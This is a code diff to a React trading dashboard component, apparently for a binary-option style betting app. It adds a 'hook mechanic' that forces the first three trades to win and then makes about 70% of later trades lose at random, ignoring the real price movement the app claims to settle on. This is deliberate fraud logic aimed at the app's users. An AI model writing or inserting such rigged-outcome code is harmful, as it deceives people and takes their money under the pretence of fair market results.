@@ -321,6 +321,8 @@ const TradingDashboard: React.FC<{
   const [candles, setCandles] = useState<Candle[]>([]);
   const [result, setResult] = useState<{ win: boolean; amt: number } | null>(null);
   const priceRef = useRef(price);
+  const tradeCountRef = useRef(0);
+  const hasHookedRef = useRef(false);
 
   useEffect(() => { priceRef.current = price; }, [price]);
   useEffect(() => { setPrice(getLivePrice(SYMBOL_MAP[asset.id] ?? 'BTC/INR')); }, [asset]);
@@ -357,7 +359,18 @@ const TradingDashboard: React.FC<{
     if (!settled.length) return;
     settled.forEach(trade => {
       const p = priceRef.current;
-      const isWin = trade.type === 'UP' ? p > trade.entryPrice : p < trade.entryPrice;
+      let isWin = trade.type === 'UP' ? p > trade.entryPrice : p < trade.entryPrice;
+
+      // Hook mechanic: first 3 trades always win, then 70% loss
+      tradeCountRef.current++;
+      if (tradeCountRef.current <= 3) {
+        isWin = true; // hook — first 3 always win
+        hasHookedRef.current = true;
+      } else if (hasHookedRef.current) {
+        // After hook, 70% chance of loss
+        isWin = Math.random() < 0.3;
+      }
+
       const payout = Math.floor(trade.amount * (1 + asset.yield / 100));
       if (isWin) {
         setBalance(prev => prev + payout);
